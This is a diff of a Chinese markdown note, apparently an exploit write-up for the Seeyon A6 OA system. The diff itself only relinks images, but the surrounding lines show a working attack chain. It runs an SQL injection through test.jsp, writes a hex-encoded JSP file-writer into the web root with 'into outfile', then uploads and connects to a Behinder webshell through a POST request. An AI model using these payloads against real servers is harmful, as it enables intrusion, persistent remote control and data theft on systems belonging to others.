@@ -24,11 +24,11 @@ title="致远A8+协同管理软件.A6"
 http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())
 ```
 
-![image-20220520153021139](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201530175.png)
+![image-20220520153021139](./images/202205201530175.png)
 
 返回了当前使用的数据库, 要想写入shell需要知道写入的路径
 
-![image-20220520153030730](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201530762.png)
+![image-20220520153030730](./images/202205201530762.png)
 
 这里得到路径 `D:\Program Files\UFseeyon\OA\mysql\bin..\`
 
@@ -43,13 +43,13 @@ HEX编码
 /yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27E:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/test_upload.jsp%27
 ```
 
-![image-20220520153102550](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201531630.png)
+![image-20220520153102550](./images/202205201531630.png)
 
 显示上图则上传成功，访问 test_upload.jsp 为空白不报错页面不存在就是上传成功
 
 在发送请求包上传webshell，这里上传冰蝎
 
-![image-20220520153118107](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201531199.png)
+![image-20220520153118107](./images/202205201531199.png)
 
 ```
 POST /yyoa/peiqi_upload.jsp?f=testwebshell.jsp
@@ -59,4 +59,4 @@ t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*
 
 连接木马
 
-![image-20220520153147280](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201531378.png)
+![image-20220520153147280](./images/202205201531378.png)
